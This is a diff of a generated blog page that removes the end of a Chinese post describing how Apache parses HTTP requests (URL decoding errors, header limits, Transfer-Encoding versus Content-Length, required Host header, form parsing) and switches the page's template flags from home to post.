-<p><img src="/2020/06/16/%E7%AE%80%E6%9E%90Apache%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82/1575639557902.png" alt="1575639557902"></p>
-<p><img src="/2020/06/16/%E7%AE%80%E6%9E%90Apache%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82/1575639039658.png" alt="1575639039658"></p>
-<p>version没被解析成功的情况下，被设置为HTTP1.0</p>
-<p><img src="/2020/06/16/%E7%AE%80%E6%9E%90Apache%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82/1575638751179.png" alt="1575638751179"></p>
-<p>URI是如何解析的，没有看到具体代码，相应的函数是个钩子函数。</p>
-<p><img src="/2020/06/16/%E7%AE%80%E6%9E%90Apache%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82/1575641409296.png" alt="1575641409296"></p>
-<p>在URL路径中，即？前面的字符串中，如果存在畸形URL编码，如%fg，则直接返回400；如果存在0字符，则返回404</p>
-<p><img src="/2020/06/16/%E7%AE%80%E6%9E%90Apache%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82/1575641491019.png" alt="1575641491019"></p>
-<h2 id="header-filed"><a href="#header-filed" class="headerlink" title="header filed"></a>header filed</h2><p>每个头部默认长度最大为8190字节，头部个数最大默认为100</p>
-<p><img src="/2020/06/16/%E7%AE%80%E6%9E%90Apache%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82/1575642413511.png" alt="1575642413511"></p>
-<p><img src="/2020/06/16/%E7%AE%80%E6%9E%90Apache%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82/1575642630350.png" alt="1575642630350"></p>
-<p>如果一个头部以SP或HT字符开头，表示该头部是上一个头部的extended，或者说是一个continue header line，该行将被合并到上一行，符合RFC。</p>
-<p><img src="/2020/06/16/%E7%AE%80%E6%9E%90Apache%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82/0570bbebcd774693909db21e89a21da2.png" alt="img"></p>
-<p><img src="/2020/06/16/%E7%AE%80%E6%9E%90Apache%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82/d1733fc5e392425f9081dc7d3e1b31ff.png" alt="img"></p>
-<p>请求域行中必须要有冒号 :</p>
-<p><img src="/2020/06/16/%E7%AE%80%E6%9E%90Apache%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82/5f8b0bd018e44015b9ca8e822a692680.png" alt="img"></p>
-<p>头部中的多个LWS字符会被跳过。</p>
-<p><img src="/2020/06/16/%E7%AE%80%E6%9E%90Apache%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82/264ae11b938641b1b83bb9402035693d.png" alt="img"></p>
-<p>相同头部字段名的头部行将被合并，缓冲区大小不变</p>
-<p><img src="/2020/06/16/%E7%AE%80%E6%9E%90Apache%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82/ae2506ae48ab4c329bda241f1c261d88.png" alt="img"></p>
-<h2 id="TE"><a href="#TE" class="headerlink" title="TE"></a>TE</h2><p>Transfer-Encoding存在时忽略Content-Length</p>
-<p><img src="/2020/06/16/%E7%AE%80%E6%9E%90Apache%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82/1575642736359.png" alt="1575642736359"></p>
-<p>TE头部的值必须为chunked</p>
-<p><img src="/2020/06/16/%E7%AE%80%E6%9E%90Apache%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82/1575647450202.png" alt="1575647450202"></p>
-<h2 id="must-hostname"><a href="#must-hostname" class="headerlink" title="must hostname"></a>must hostname</h2><p>http 1.1必须要有host头部字段，否则返回400</p>
-<p><img src="/2020/06/16/%E7%AE%80%E6%9E%90Apache%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82/908d16b3e233405abbdba1fc3360eeac.png" alt="img"></p>
-<p>当Content-Type不为空且前面33个字符值为application/x-www-form-urlencoded时，会将Body认为为表单，并以”&amp;”符号分割表单，“=”区分key value，并且会对二者都进行URL解码，详细代码冗长，就不贴出来了。</p>
-<p><img src="/2020/06/16/%E7%AE%80%E6%9E%90Apache%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82/1575646708932.png" alt="1575646708932"></p>
-<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>代码最后看下来，在HTTP解析这块，我们需要关注的要点不是很繁多，而C代码只以业务功能的视角来浏览的话，不难。</p>
-<p>不过没有看到Apache解析multipart/form-data的代码；还有其他容器后续慢慢看吧。</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/06/16/%E7%AE%80%E6%9E%90Apache%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
   
   
-    <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
-    </nav>
+  
+
+  
+
+  
+
   
 
 
@@ -1451,8 +384,8 @@
     <script>
 	var yiliaConfig = {
 		mathjax: false,
-		isHome: true,
-		isPost: false,
+		isHome: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
